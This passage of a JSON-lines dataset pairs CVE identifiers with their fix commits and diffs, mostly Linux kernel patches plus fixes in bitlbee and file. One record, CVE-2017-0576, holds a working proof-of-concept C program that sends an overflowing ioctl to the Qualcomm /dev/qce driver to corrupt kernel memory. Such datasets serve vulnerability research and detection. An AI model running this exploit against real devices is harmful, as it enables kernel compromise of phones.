\\\n+\tMODULE_ALIAS(\"netdev-\" device)\n+\n #if defined(DEBUG)\n #define netdev_dbg(__dev, format, args...)\t\t\t\\\n \tnetdev_printk(KERN_DEBUG, __dev, format, ##args)\ndiff --git a/net/core/dev.c b/net/core/dev.c\nindex 8ae6631abcc20..6561021d22d1f 100644\n--- a/net/core/dev.c\n+++ b/net/core/dev.c\n@@ -1114,13 +1114,21 @@ EXPORT_SYMBOL(netdev_bonding_change);\n void dev_load(struct net *net, const char *name)\n {\n \tstruct net_device *dev;\n+\tint no_module;\n \n \trcu_read_lock();\n \tdev = dev_get_by_name_rcu(net, name);\n \trcu_read_unlock();\n \n-\tif (!dev && capable(CAP_NET_ADMIN))\n-\t\trequest_module(\"%s\", name);\n+\tno_module = !dev;\n+\tif (no_module && capable(CAP_NET_ADMIN))\n+\t\tno_module = request_module(\"netdev-%s\", name);\n+\tif (no_module && capable(CAP_SYS_MODULE)) {\n+\t\tif (!request_module(\"%s\", name))\n+\t\t\tpr_err(\"Loading kernel module for a network device \"\n+\"with CAP_SYS_MODULE (deprecated).  Use CAP_NET_ADMIN and alias netdev-%s \"\n+\"instead\\n\", name);\n+\t}\n }\n EXPORT_SYMBOL(dev_load);\n \ndiff --git a/net/ipv4/ip_gre.c b/net/ipv4/ip_gre.c\nindex 6613edfac28c1..d1d0e2c256fc4 100644\n--- a/net/ipv4/ip_gre.c\n+++ b/net/ipv4/ip_gre.c\n@@ -1765,4 +1765,4 @@ module_exit(ipgre_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_ALIAS_RTNL_LINK(\"gre\");\n MODULE_ALIAS_RTNL_LINK(\"gretap\");\n-MODULE_ALIAS(\"gre0\");\n+MODULE_ALIAS_NETDEV(\"gre0\");\ndiff --git a/net/ipv4/ipip.c b/net/ipv4/ipip.c\nindex 988f52fba54a1..a5f58e7cbb26e 100644\n--- a/net/ipv4/ipip.c\n+++ b/net/ipv4/ipip.c\n@@ -913,4 +913,4 @@ static void __exit ipip_fini(void)\n module_init(ipip_init);\n module_exit(ipip_fini);\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"tunl0\");\n+MODULE_ALIAS_NETDEV(\"tunl0\");\ndiff --git a/net/ipv6/sit.c b/net/ipv6/sit.c\nindex 8ce38f10a547e..d2c16e10f6508 100644\n--- a/net/ipv6/sit.c\n+++ b/net/ipv6/sit.c\n@@ -1290,4 +1290,4 @@ static int __init sit_init(void)\n module_init(sit_init);\n module_exit(sit_cleanup);\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"sit0\");\n+MODULE_ALIAS_NETDEV(\"sit0\");\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2016-8636", "CWE_ID": "190", "category": "security", "commit_id": "647bf3d8a8e5777319da92af672289b2a6c4dc66", "commit_message": "From 647bf3d8a8e5777319da92af672289b2a6c4dc66 Mon Sep 17 00:00:00 2001\nFrom: Eyal Itkin <eyal.itkin@gmail.com>\nDate: Tue, 7 Feb 2017 16:45:19 +0300\nSubject: [PATCH] IB/rxe: Fix mem_check_range integer overflow\n\nUpdate the range check to avoid integer-overflow in edge case.\nResolves CVE 2016-8636.\n\nSigned-off-by: Eyal Itkin <eyal.itkin@gmail.com>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nReviewed-by: Leon Romanovsky <leonro@mellanox.com>\nSigned-off-by: Doug Ledford <dledford@redhat.com>\n---\n drivers/infiniband/sw/rxe/rxe_mr.c | 8 +++++---\n 1 file changed, 5 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/drivers/infiniband/sw/rxe/rxe_mr.c b/drivers/infiniband/sw/rxe/rxe_mr.c\nindex d0faca294006f..86a6585b847df 100644\n--- a/drivers/infiniband/sw/rxe/rxe_mr.c\n+++ b/drivers/infiniband/sw/rxe/rxe_mr.c\n@@ -59,9 +59,11 @@ int mem_check_range(struct rxe_mem *mem, u64 iova, size_t length)\n \n \tcase RXE_MEM_TYPE_MR:\n \tcase RXE_MEM_TYPE_FMR:\n-\t\treturn ((iova < mem->iova) ||\n-\t\t\t((iova + length) > (mem->iova + mem->length))) ?\n-\t\t\t-EFAULT : 0;\n+\t\tif (iova < mem->iova ||\n+\t\t    length > mem->length ||\n+\t\t    iova > mem->iova + mem->length - length)\n+\t\t\treturn -EFAULT;\n+\t\treturn 0;\n \n \tdefault:\n \t\treturn -EFAULT;\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2016-3672", "CWE_ID": "254", "category": "security", "commit_id": "8b8addf891de8a00e4d39fc32f93f7c5eb8feceb", "commit_message": "From 8b8addf891de8a00e4d39fc32f93f7c5eb8feceb Mon Sep 17 00:00:00 2001\nFrom: Hector Marco-Gisbert <hecmargi@upv.es>\nDate: Thu, 10 Mar 2016 20:51:00 +0100\nSubject: x86/mm/32: Enable full randomization on i386 and X86_32\n\nCurrently on i386 and on X86_64 when emulating X86_32 in legacy mode, only\nthe stack and the executable are randomized but not other mmapped files\n(libraries, vDSO, etc.). This patch enables randomization for the\nlibraries, vDSO and mmap requests on i386 and in X86_32 in legacy mode.\n\nBy default on i386 there are 8 bits for the randomization of the libraries,\nvDSO and mmaps which only uses 1MB of VA.\n\nThis patch preserves the original randomness, using 1MB of VA out of 3GB or\n4GB. We think that 1MB out of 3GB is not a big cost for having the ASLR.\n\nThe first obvious security benefit is that all objects are randomized (not\nonly the stack and the executable) in legacy mode which highly increases\nthe ASLR effectiveness, otherwise the attackers may use these\nnon-randomized areas. But also sensitive setuid/setgid applications are\nmore secure because currently, attackers can disable the randomization of\nthese applications by setting the ulimit stack to \"unlimited\". This is a\nvery old and widely known trick to disable the ASLR in i386 which has been\nallowed for too long.\n\nAnother trick used to disable the ASLR was to set the ADDR_NO_RANDOMIZE\npersonality flag, but fortunately this doesn't work on setuid/setgid\napplications because there is security checks which clear Security-relevant\nflags.\n\nThis patch always randomizes the mmap_legacy_base address, removing the\npossibility to disable the ASLR by setting the stack to \"unlimited\".\n\nSigned-off-by: Hector Marco-Gisbert <hecmargi@upv.es>\nAcked-by: Ismael Ripoll Ripoll <iripoll@upv.es>\nAcked-by: Kees Cook <keescook@chromium.org>\nAcked-by: Arjan van de Ven <arjan@linux.intel.com>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Thomas Gleixner <tglx@linutronix.de>\nCc: akpm@linux-foundation.org\nCc: kees Cook <keescook@chromium.org>\nLink: http://lkml.kernel.org/r/1457639460-5242-1-git-send-email-hecmargi@upv.es\nSigned-off-by: Ingo Molnar <mingo@kernel.org>\n---\n arch/x86/mm/mmap.c | 14 +-------------\n 1 file changed, 1 insertion(+), 13 deletions(-)\n\n", "diff_code": "diff --git a/arch/x86/mm/mmap.c b/arch/x86/mm/mmap.c\nindex 96bd1e2bffaf..389939f74dd5 100644\n--- a/arch/x86/mm/mmap.c\n+++ b/arch/x86/mm/mmap.c\n@@ -93,18 +93,6 @@ static unsigned long mmap_base(unsigned long rnd)\n \treturn PAGE_ALIGN(TASK_SIZE - gap - rnd);\n }\n \n-/*\n- * Bottom-up (legacy) layout on X86_32 did not support randomization, X86_64\n- * does, but not when emulating X86_32\n- */\n-static unsigned long mmap_legacy_base(unsigned long rnd)\n-{\n-\tif (mmap_is_ia32())\n-\t\treturn TASK_UNMAPPED_BASE;\n-\telse\n-\t\treturn TASK_UNMAPPED_BASE + rnd;\n-}\n-\n /*\n  * This function, called very early during the creation of a new\n  * process VM image, sets up which VM layout function to use:\n@@ -116,7 +104,7 @@ void arch_pick_mmap_layout(struct mm_struct *mm)\n \tif (current->flags & PF_RANDOMIZE)\n \t\trandom_factor = arch_mmap_rnd();\n \n-\tmm->mmap_legacy_base = mmap_legacy_base(random_factor);\n+\tmm->mmap_legacy_base = TASK_UNMAPPED_BASE + random_factor;\n \n \tif (mmap_is_legacy()) {\n \t\tmm->mmap_base = mm->mmap_legacy_base;\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-0576", "CWE_ID": "264", "category": "security", "commit_id": "0dd1a733e60cf5239c0a185d4219ba2ef1118a8b", "commit_message": "From 0dd1a733e60cf5239c0a185d4219ba2ef1118a8b Mon Sep 17 00:00:00 2001\nFrom: derrek <derrek.haxx@yahoo.com>\nDate: Mon, 3 Apr 2017 20:54:04 +0200\nSubject: [PATCH] =?UTF-8?q?CVE-2017-0576=20Android=20Security=20Bulletin?=\n =?UTF-8?q?=E2=80=94April=202017?=\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\n---\n .../qcom_qcedev_byteoffset_overflow.c         | 160 ++++++++++++++++++\n 1 file changed, 160 insertions(+)\n create mode 100644 CVE-2017-0576/qcom_qcedev_byteoffset_overflow.c\n\n", "diff_code": "diff --git a/CVE-2017-0576/qcom_qcedev_byteoffset_overflow.c b/CVE-2017-0576/qcom_qcedev_byteoffset_overflow.c\nnew file mode 100644\nindex 0000000..13121a2\n--- /dev/null\n+++ b/CVE-2017-0576/qcom_qcedev_byteoffset_overflow.c\n@@ -0,0 +1,160 @@\n+#include <stdlib.h>\n+#include <stdio.h>\n+#include <unistd.h>\n+#include <sys/ioctl.h>\n+#include <sys/types.h>\n+#include <sys/stat.h>\n+#include <sys/mman.h>\n+#include <fcntl.h>\n+#include <limits.h>\n+#include <inttypes.h>\n+\n+\n+/*\n+ * PoC By Scott Bauer\n+ * Bug found by derrek\n+ */\n+\n+\n+static const char *dev = \"/dev/qce\";\n+\n+#define QCEDEV_MAX_KEY_SIZE     64\n+#define QCEDEV_MAX_IV_SIZE      32\n+#define QCEDEV_MAX_BUFFERS      16\n+\n+\n+struct  buf_info {\n+        union {\n+                uint32_t        offset;\n+                uint8_t         *vaddr;\n+        };\n+        uint32_t        len;\n+};\n+struct  qcedev_vbuf_info {\n+        struct buf_info src[QCEDEV_MAX_BUFFERS];\n+        struct buf_info dst[QCEDEV_MAX_BUFFERS];\n+};\n+\n+struct  qcedev_pmem_info {\n+        int             fd_src;\n+        struct buf_info src[QCEDEV_MAX_BUFFERS];\n+        int             fd_dst;\n+        struct buf_info dst[QCEDEV_MAX_BUFFERS];\n+};\n+\n+enum qcedev_oper_enum {\n+        QCEDEV_OPER_DEC         = 0,\n+        QCEDEV_OPER_ENC         = 1,\n+        QCEDEV_OPER_DEC_NO_KEY  = 2,\n+        QCEDEV_OPER_ENC_NO_KEY  = 3,\n+        QCEDEV_OPER_LAST\n+};\n+\n+enum qcedev_cipher_alg_enum {\n+        QCEDEV_ALG_DES          = 0,\n+        QCEDEV_ALG_3DES         = 1,\n+        QCEDEV_ALG_AES          = 2,\n+        QCEDEV_ALG_LAST\n+};\n+\n+enum qcedev_cipher_mode_enum {\n+        QCEDEV_AES_MODE_CBC     = 0,\n+        QCEDEV_AES_MODE_ECB     = 1,\n+        QCEDEV_AES_MODE_CTR     = 2,\n+        QCEDEV_AES_MODE_XTS     = 3,\n+        QCEDEV_AES_MODE_CCM     = 4,\n+        QCEDEV_DES_MODE_CBC     = 5,\n+        QCEDEV_DES_MODE_ECB     = 6,\n+        QCEDEV_AES_DES_MODE_LAST\n+};\n+\n+struct  qcedev_cipher_op_req {\n+        uint8_t                         use_pmem;\n+        union {\n+                struct qcedev_pmem_info pmem;\n+                struct qcedev_vbuf_info vbuf;\n+        };\n+        uint32_t                        entries;\n+        uint32_t                        data_len;\n+        uint8_t                         in_place_op;\n+        uint8_t                         enckey[QCEDEV_MAX_KEY_SIZE];\n+        uint32_t                        encklen;\n+        uint8_t                         iv[QCEDEV_MAX_IV_SIZE];\n+        uint32_t                        ivlen;\n+        uint32_t                        byteoffset;\n+        enum qcedev_cipher_alg_enum     alg;\n+        enum qcedev_cipher_mode_enum    mode;\n+        enum qcedev_oper_enum           op;\n+};\n+\n+#define QCEDEV_IOC_MAGIC        0x87\n+\n+#define QCEDEV_IOCTL_ENC_REQ            \\\n+        _IOWR(QCEDEV_IOC_MAGIC, 1, struct qcedev_cipher_op_req)\n+#define QCEDEV_IOCTL_DEC_REQ            \\\n+        _IOWR(QCEDEV_IOC_MAGIC, 2, struct qcedev_cipher_op_req)\n+\n+\n+\n+void thread_func(unsigned int start, unsigned int end, int fd)\n+{\n+\tstruct qcedev_cipher_op_req req = { 0 };\n+\tunsigned int i;\n+\tchar *data;\n+\n+\tdata = mmap(NULL, 0xFFFFFF * 3, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);\n+\tif (data == MAP_FAILED) {\n+\t\tprintf(\"mmap failed, get a better phone\\n\");\n+\t\texit(0);\n+\t}\n+\tfor (i = 0; i < 0xFFFFFF * 3; i += sizeof(void*))\n+\t\t*((unsigned long *)(data + i)) = 0xABADACC355001337;\n+\n+\n+\treq.in_place_op = 1;\n+\t/* setup the parameters to pass a few sanity checks */\n+\treq.entries = 2;\n+\treq.byteoffset = 15;\n+\treq.mode = QCEDEV_AES_MODE_CTR;\n+\n+\treq.op = QCEDEV_OPER_ENC;//_NO_KEY;\n+\treq.ivlen = 1;\n+\treq.data_len = 0xFFFFFFFE;\n+\treq.vbuf.src[0].len = 4;\n+\treq.vbuf.src[1].len = 0xFFFFFFFE - 4;\n+\treq.vbuf.src[0].vaddr = (uint8_t*)data;\n+\treq.vbuf.src[1].vaddr = (uint8_t*)data;\n+\treq.vbuf.dst[0].len = 4;\n+\treq.vbuf.dst[1].len = 0xFFFFFFFE - 4;\n+\treq.vbuf.dst[0].vaddr = (uint8_t*)data;\n+\treq.vbuf.dst[1].vaddr = (uint8_t*)data;\n+\n+\t\n+\tioctl(fd, QCEDEV_IOCTL_ENC_REQ, &req);\n+\n+\tprintf(\"exiting\\n\");\n+\texit(0);\n+}\n+\n+int main(void)\n+{\n+\tint fd;\n+\tunsigned int i;\n+\tunsigned int start = 0;\n+\tunsigned int _gap = ~0;\n+\tunsigned int gap = _gap / 8;\n+\tstruct qcedev_cipher_op_req req = { 0 };\n+\t//char data[32] = { A };\n+\tchar *data;\n+\tfd = open(dev, O_RDWR);\n+\tif (fd < 0) {\n+\t\tprintf(\"Failed to open %s with errno %s\\n\", dev,\n+\t\t       strerror(errno));\n+\t\treturn EXIT_FAILURE;\n+\n+\t}\n+\tthread_func(start, start + gap, fd);\n+\n+\tsleep(1000000);\n+\treturn EXIT_FAILURE;\n+}\n", "owner": "derrekr", "repo": "android_security", "source": "cve"}
{"CVE_ID": "CVE-2012-6543", "CWE_ID": "200", "category": "security", "commit_id": "04d4fbca1017c11381e7d82acea21dd741e748bc", "commit_message": "From 04d4fbca1017c11381e7d82acea21dd741e748bc Mon Sep 17 00:00:00 2001\nFrom: Mathias Krause <minipli@googlemail.com>\nDate: Wed, 15 Aug 2012 11:31:52 +0000\nSubject: [PATCH] l2tp: fix info leak via getsockname()\n\nThe L2TP code for IPv6 fails to initialize the l2tp_unused member of\nstruct sockaddr_l2tpip6 and that for leaks two bytes kernel stack via\nthe getsockname() syscall. Initialize l2tp_unused with 0 to avoid the\ninfo leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nCc: James Chapman <jchapman@katalix.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net/l2tp/l2tp_ip6.c | 1 +\n 1 file changed, 1 insertion(+)\n\n", "diff_code": "diff --git a/net/l2tp/l2tp_ip6.c b/net/l2tp/l2tp_ip6.c\nindex 35e1e4bde5873..927547171bc71 100644\n--- a/net/l2tp/l2tp_ip6.c\n+++ b/net/l2tp/l2tp_ip6.c\n@@ -410,6 +410,7 @@ static int l2tp_ip6_getname(struct socket *sock, struct sockaddr *uaddr,\n \tlsa->l2tp_family = AF_INET6;\n \tlsa->l2tp_flowinfo = 0;\n \tlsa->l2tp_scope_id = 0;\n+\tlsa->l2tp_unused = 0;\n \tif (peer) {\n \t\tif (!lsk->peer_conn_id)\n \t\t\treturn -ENOTCONN;\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2016-3134", "CWE_ID": "119", "category": "security", "commit_id": "54d83fc74aa9ec72794373cb47432c5f7fb1a309", "commit_message": "From 54d83fc74aa9ec72794373cb47432c5f7fb1a309 Mon Sep 17 00:00:00 2001\nFrom: Florian Westphal <fw@strlen.de>\nDate: Tue, 22 Mar 2016 18:02:52 +0100\nSubject: [PATCH] netfilter: x_tables: fix unconditional helper\n\nBen Hawkes says:\n\n In the mark_source_chains function (net/ipv4/netfilter/ip_tables.c) it\n is possible for a user-supplied ipt_entry structure to have a large\n next_offset field. This field is not bounds checked prior to writing a\n counter value at the supplied offset.\n\nProblem is that mark_source_chains should not have been called --\nthe rule doesn't have a next entry, so its supposed to return\nan absolute verdict of either ACCEPT or DROP.\n\nHowever, the function conditional() doesn't work as the name implies.\nIt only checks that the rule is using wildcard address matching.\n\nHowever, an unconditional rule must also not be using any matches\n(no -m args).\n\nThe underflow validator only checked the addresses, therefore\npassing the 'unconditional absolute verdict' test, while\nmark_source_chains also tested for presence of matches, and thus\nproceeeded to the next (not-existent) rule.\n\nUnify this so that all the callers have same idea of 'unconditional rule'.\n\nReported-by: Ben Hawkes <hawkes@google.com>\nSigned-off-by: Florian Westphal <fw@strlen.de>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>\n---\n net/ipv4/netfilter/arp_tables.c | 18 +++++++++---------\n net/ipv4/netfilter/ip_tables.c  | 23 +++++++++++------------\n net/ipv6/netfilter/ip6_tables.c | 23 +++++++++++------------\n 3 files changed, 31 insertions(+), 33 deletions(-)\n\n", "diff_code": "diff --git a/net/ipv4/netfilter/arp_tables.c b/net/ipv4/netfilter/arp_tables.c\nindex 51d4fe56b807b..a1bb5e7129a2f 100644\n--- a/net/ipv4/netfilter/arp_tables.c\n+++ b/net/ipv4/netfilter/arp_tables.c\n@@ -359,11 +359,12 @@ unsigned int arpt_do_table(struct sk_buff *skb,\n }\n \n /* All zeroes == unconditional rule. */\n-static inline bool unconditional(const struct arpt_arp *arp)\n+static inline bool unconditional(const struct arpt_entry *e)\n {\n \tstatic const struct arpt_arp uncond;\n \n-\treturn memcmp(arp, &uncond, sizeof(uncond)) == 0;\n+\treturn e->target_offset == sizeof(struct arpt_entry) &&\n+\t       memcmp(&e->arp, &uncond, sizeof(uncond)) == 0;\n }\n \n /* Figures out from what hook each rule can be called: returns 0 if\n@@ -402,11 +403,10 @@ static int mark_source_chains(const struct xt_table_info *newinfo,\n \t\t\t\t|= ((1 << hook) | (1 << NF_ARP_NUMHOOKS));\n \n \t\t\t/* Unconditional return/END. */\n-\t\t\tif ((e->target_offset == sizeof(struct arpt_entry) &&\n+\t\t\tif ((unconditional(e) &&\n \t\t\t     (strcmp(t->target.u.user.name,\n \t\t\t\t     XT_STANDARD_TARGET) == 0) &&\n-\t\t\t     t->verdict < 0 && unconditional(&e->arp)) ||\n-\t\t\t    visited) {\n+\t\t\t     t->verdict < 0) || visited) {\n \t\t\t\tunsigned int oldpos, size;\n \n \t\t\t\tif ((strcmp(t->target.u.user.name,\n@@ -551,7 +551,7 @@ static bool check_underflow(const struct arpt_entry *e)\n \tconst struct xt_entry_target *t;\n \tunsigned int verdict;\n \n-\tif (!unconditional(&e->arp))\n+\tif (!unconditional(e))\n \t\treturn false;\n \tt = arpt_get_target_c(e);\n \tif (strcmp(t->u.user.name, XT_STANDARD_TARGET) != 0)\n@@ -598,9 +598,9 @@ static inline int check_entry_size_and_hooks(struct arpt_entry *e,\n \t\t\tnewinfo->hook_entry[h] = hook_entries[h];\n \t\tif ((unsigned char *)e - base == underflows[h]) {\n \t\t\tif (!check_underflow(e)) {\n-\t\t\t\tpr_err(\"Underflows must be unconditional and \"\n-\t\t\t\t       \"use the STANDARD target with \"\n-\t\t\t\t       \"ACCEPT/DROP\\n\");\n+\t\t\t\tpr_debug(\"Underflows must be unconditional and \"\n+\t\t\t\t\t \"use the STANDARD target with \"\n+\t\t\t\t\t \"ACCEPT/DROP\\n\");\n \t\t\t\treturn -EINVAL;\n \t\t\t}\n \t\t\tnewinfo->underflow[h] = underflows[h];\ndiff --git a/net/ipv4/netfilter/ip_tables.c b/net/ipv4/netfilter/ip_tables.c\nindex fb7694e6663e8..89b5d959eda31 100644\n--- a/net/ipv4/netfilter/ip_tables.c\n+++ b/net/ipv4/netfilter/ip_tables.c\n@@ -168,11 +168,12 @@ get_entry(const void *base, unsigned int offset)\n \n /* All zeroes == unconditional rule. */\n /* Mildly perf critical (only if packet tracing is on) */\n-static inline bool unconditional(const struct ipt_ip *ip)\n+static inline bool unconditional(const struct ipt_entry *e)\n {\n \tstatic const struct ipt_ip uncond;\n \n-\treturn memcmp(ip, &uncond, sizeof(uncond)) == 0;\n+\treturn e->target_offset == sizeof(struct ipt_entry) &&\n+\t       memcmp(&e->ip, &uncond, sizeof(uncond)) == 0;\n #undef FWINV\n }\n \n@@ -229,11 +230,10 @@ get_chainname_rulenum(const struct ipt_entry *s, const struct ipt_entry *e,\n \t} else if (s == e) {\n \t\t(*rulenum)++;\n \n-\t\tif (s->target_offset == sizeof(struct ipt_entry) &&\n+\t\tif (unconditional(s) &&\n \t\t    strcmp(t->target.u.kernel.target->name,\n \t\t\t   XT_STANDARD_TARGET) == 0 &&\n-\t\t   t->verdict < 0 &&\n-\t\t   unconditional(&s->ip)) {\n+\t\t   t->verdict < 0) {\n \t\t\t/* Tail of chains: STANDARD target (return/policy) */\n \t\t\t*comment = *chainname == hookname\n \t\t\t\t? comments[NF_IP_TRACE_COMMENT_POLICY]\n@@ -476,11 +476,10 @@ mark_source_chains(const struct xt_table_info *newinfo,\n \t\t\te->comefrom |= ((1 << hook) | (1 << NF_INET_NUMHOOKS));\n \n \t\t\t/* Unconditional return/END. */\n-\t\t\tif ((e->target_offset == sizeof(struct ipt_entry) &&\n+\t\t\tif ((unconditional(e) &&\n \t\t\t     (strcmp(t->target.u.user.name,\n \t\t\t\t     XT_STANDARD_TARGET) == 0) &&\n-\t\t\t     t->verdict < 0 && unconditional(&e->ip)) ||\n-\t\t\t    visited) {\n+\t\t\t     t->verdict < 0) || visited) {\n \t\t\t\tunsigned int oldpos, size;\n \n \t\t\t\tif ((strcmp(t->target.u.user.name,\n@@ -715,7 +714,7 @@ static bool check_underflow(const struct ipt_entry *e)\n \tconst struct xt_entry_target *t;\n \tunsigned int verdict;\n \n-\tif (!unconditional(&e->ip))\n+\tif (!unconditional(e))\n \t\treturn false;\n \tt = ipt_get_target_c(e);\n \tif (strcmp(t->u.user.name, XT_STANDARD_TARGET) != 0)\n@@ -763,9 +762,9 @@ check_entry_size_and_hooks(struct ipt_entry *e,\n \t\t\tnewinfo->hook_entry[h] = hook_entries[h];\n \t\tif ((unsigned char *)e - base == underflows[h]) {\n \t\t\tif (!check_underflow(e)) {\n-\t\t\t\tpr_err(\"Underflows must be unconditional and \"\n-\t\t\t\t       \"use the STANDARD target with \"\n-\t\t\t\t       \"ACCEPT/DROP\\n\");\n+\t\t\t\tpr_debug(\"Underflows must be unconditional and \"\n+\t\t\t\t\t \"use the STANDARD target with \"\n+\t\t\t\t\t \"ACCEPT/DROP\\n\");\n \t\t\t\treturn -EINVAL;\n \t\t\t}\n \t\t\tnewinfo->underflow[h] = underflows[h];\ndiff --git a/net/ipv6/netfilter/ip6_tables.c b/net/ipv6/netfilter/ip6_tables.c\nindex b248528f2a172..541b59f835952 100644\n--- a/net/ipv6/netfilter/ip6_tables.c\n+++ b/net/ipv6/netfilter/ip6_tables.c\n@@ -198,11 +198,12 @@ get_entry(const void *base, unsigned int offset)\n \n /* All zeroes == unconditional rule. */\n /* Mildly perf critical (only if packet tracing is on) */\n-static inline bool unconditional(const struct ip6t_ip6 *ipv6)\n+static inline bool unconditional(const struct ip6t_entry *e)\n {\n \tstatic const struct ip6t_ip6 uncond;\n \n-\treturn memcmp(ipv6, &uncond, sizeof(uncond)) == 0;\n+\treturn e->target_offset == sizeof(struct ip6t_entry) &&\n+\t       memcmp(&e->ipv6, &uncond, sizeof(uncond)) == 0;\n }\n \n static inline const struct xt_entry_target *\n@@ -258,11 +259,10 @@ get_chainname_rulenum(const struct ip6t_entry *s, const struct ip6t_entry *e,\n \t} else if (s == e) {\n \t\t(*rulenum)++;\n \n-\t\tif (s->target_offset == sizeof(struct ip6t_entry) &&\n+\t\tif (unconditional(s) &&\n \t\t    strcmp(t->target.u.kernel.target->name,\n \t\t\t   XT_STANDARD_TARGET) == 0 &&\n-\t\t    t->verdict < 0 &&\n-\t\t    unconditional(&s->ipv6)) {\n+\t\t    t->verdict < 0) {\n \t\t\t/* Tail of chains: STANDARD target (return/policy) */\n \t\t\t*comment = *chainname == hookname\n \t\t\t\t? comments[NF_IP6_TRACE_COMMENT_POLICY]\n@@ -488,11 +488,10 @@ mark_source_chains(const struct xt_table_info *newinfo,\n \t\t\te->comefrom |= ((1 << hook) | (1 << NF_INET_NUMHOOKS));\n \n \t\t\t/* Unconditional return/END. */\n-\t\t\tif ((e->target_offset == sizeof(struct ip6t_entry) &&\n+\t\t\tif ((unconditional(e) &&\n \t\t\t     (strcmp(t->target.u.user.name,\n \t\t\t\t     XT_STANDARD_TARGET) == 0) &&\n-\t\t\t     t->verdict < 0 &&\n-\t\t\t     unconditional(&e->ipv6)) || visited) {\n+\t\t\t     t->verdict < 0) || visited) {\n \t\t\t\tunsigned int oldpos, size;\n \n \t\t\t\tif ((strcmp(t->target.u.user.name,\n@@ -727,7 +726,7 @@ static bool check_underflow(const struct ip6t_entry *e)\n \tconst struct xt_entry_target *t;\n \tunsigned int verdict;\n \n-\tif (!unconditional(&e->ipv6))\n+\tif (!unconditional(e))\n \t\treturn false;\n \tt = ip6t_get_target_c(e);\n \tif (strcmp(t->u.user.name, XT_STANDARD_TARGET) != 0)\n@@ -775,9 +774,9 @@ check_entry_size_and_hooks(struct ip6t_entry *e,\n \t\t\tnewinfo->hook_entry[h] = hook_entries[h];\n \t\tif ((unsigned char *)e - base == underflows[h]) {\n \t\t\tif (!check_underflow(e)) {\n-\t\t\t\tpr_err(\"Underflows must be unconditional and \"\n-\t\t\t\t       \"use the STANDARD target with \"\n-\t\t\t\t       \"ACCEPT/DROP\\n\");\n+\t\t\t\tpr_debug(\"Underflows must be unconditional and \"\n+\t\t\t\t\t \"use the STANDARD target with \"\n+\t\t\t\t\t \"ACCEPT/DROP\\n\");\n \t\t\t\treturn -EINVAL;\n \t\t\t}\n \t\t\tnewinfo->underflow[h] = underflows[h];\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-5668", "CWE_ID": "476", "category": "security", "commit_id": "30d598ce7cd3f136ee9d7097f39fa9818a272441", "commit_message": "From 30d598ce7cd3f136ee9d7097f39fa9818a272441 Mon Sep 17 00:00:00 2001\nFrom: dequis <dx@dxzone.com.ar>\nDate: Sun, 29 Jan 2017 19:40:09 -0300\nSubject: [PATCH] purple: Fix crash on ft requests from unknown contacts\n\nFollowup to 701ab81 (included in 3.5) which was a partial fix which only\nimproved things for non-libpurple file transfers (that is, just jabber)\n---\n protocols/purple/ft.c | 4 ++++\n 1 file changed, 4 insertions(+)\n\n", "diff_code": "diff --git a/protocols/purple/ft.c b/protocols/purple/ft.c\nindex 81fee8d0..79476ebc 100644\n--- a/protocols/purple/ft.c\n+++ b/protocols/purple/ft.c\n@@ -145,6 +145,10 @@ static gboolean prplcb_xfer_new_send_cb(gpointer data, gint fd, b_input_conditio\n \t/* TODO(wilmer): After spreading some more const goodness in BitlBee,\n \t   remove the evil cast below. */\n \tpx->ft = imcb_file_send_start(ic, (char *) who, xfer->filename, xfer->size);\n+\n+\tif (!px->ft) {\n+\t\treturn FALSE;\n+\t}\n \tpx->ft->data = px;\n \n \tpx->ft->accept = prpl_xfer_accept;\n", "owner": "bitlbee", "repo": "bitlbee", "source": "cve"}
{"CVE_ID": "CVE-2014-3587", "CWE_ID": "189", "category": "security", "commit_id": "0641e56be1af003aa02c7c6b0184466540637233", "commit_message": "From 0641e56be1af003aa02c7c6b0184466540637233 Mon Sep 17 00:00:00 2001\nFrom: Christos Zoulas <christos@zoulas.com>\nDate: Thu, 7 Aug 2014 09:38:35 +0000\nSubject: [PATCH] Prevent wrap around (Remi Collet at redhat)\n\n---\n src/cdf.c | 6 +++++-\n 1 file changed, 5 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/src/cdf.c b/src/cdf.c\nindex 5dbf3b13e..3e691f4c6 100644\n--- a/src/cdf.c\n+++ b/src/cdf.c\n@@ -35,7 +35,7 @@\n #include \"file.h\"\n \n #ifndef lint\n-FILE_RCSID(\"@(#)$File: cdf.c,v 1.63 2014/06/09 13:04:37 christos Exp $\")\n+FILE_RCSID(\"@(#)$File: cdf.c,v 1.64 2014/07/24 19:35:39 christos Exp $\")\n #endif\n \n #include <assert.h>\n@@ -835,6 +835,10 @@ cdf_read_property_info(const cdf_stream_t *sst, const cdf_header_t *h,\n \t\tq = (const uint8_t *)(const void *)\n \t\t    ((const char *)(const void *)p + ofs\n \t\t    - 2 * sizeof(uint32_t));\n+\t\tif (q < p) {\n+\t\t\tDPRINTF((\"Wrapped around %p < %p\\n\", q, p));\n+\t\t\tgoto out;\n+\t\t}\n \t\tif (q > e) {\n \t\t\tDPRINTF((\"Ran of the end %p > %p\\n\", q, e));\n \t\t\tgoto out;\n", "owner": "file", "repo": "file", "source": "cve"}
